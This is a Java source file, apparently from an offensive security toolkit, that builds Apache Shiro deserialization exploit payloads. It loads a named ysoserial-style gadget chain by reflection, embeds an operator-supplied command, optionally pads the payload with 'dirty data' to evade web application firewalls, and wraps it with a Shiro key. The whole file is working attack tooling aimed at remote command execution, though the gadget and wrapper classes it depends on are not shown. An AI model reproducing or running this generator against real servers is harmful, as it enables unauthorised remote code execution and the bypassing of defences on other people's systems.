package com.ding0x0.other;

import com.ding0x0.AbsGenerate;
import com.ding0x0.Payload;
import com.ding0x0.yso.PayloadWrapper;
import com.ding0x0.yso.payloads.DirtyDataWrapper;
import com.ding0x0.yso.payloads.ObjectPayload;

import java.lang.reflect.InvocationTargetException;

public class GenerateShiroPayload extends AbsGenerate {

    String gadget;
    String key;
    String cmd;
    String dirty;

    public GenerateShiroPayload(String gadget, String key, String cmd, String dirty){
        this.gadget = gadget;
        this.key = key;
        this.cmd = cmd;
        this.dirty = dirty;
    }

    @Override
    public Object generatePayload() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        Class<?> clazz = Class.forName("com.ding0x0.yso.payloads." + this.gadget);
        ObjectPayload obj = (ObjectPayload) clazz.newInstance();
        Object payload = null;
        try {
            payload = obj.getObject(this.cmd);
        }catch (Exception ignore){}
        if (this.dirty != null){
            DirtyDataWrapper wrapper = new DirtyDataWrapper(obj,Integer.parseInt(this.dirty));
            payload = wrapper.doWrap();
        }
        return new ShiroPayload(this.key, payload);
    }
}
